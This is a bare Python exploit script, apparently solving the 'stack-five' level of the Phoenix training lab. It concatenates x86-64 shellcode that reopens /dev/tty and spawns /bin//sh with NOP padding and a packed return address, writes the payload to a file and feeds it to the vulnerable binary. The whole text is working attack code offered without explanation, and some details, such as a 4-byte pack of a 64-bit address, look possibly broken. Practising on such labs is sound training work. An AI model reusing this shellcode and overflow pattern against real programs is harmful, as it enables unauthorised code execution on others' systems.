import os
import struct

offset = 136
overflow = struct.pack("I", 0x00004005f4)
shellcode = "\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"
nop = '\x90'
exploit = shellcode+(nop*(offset-len(shellcode))) + overflow 

with open("stack-five", "wb") as f:
        f.write(exploit)

os.system("/opt/phoenix/amd64/stack-five < stack-five")
f.close()

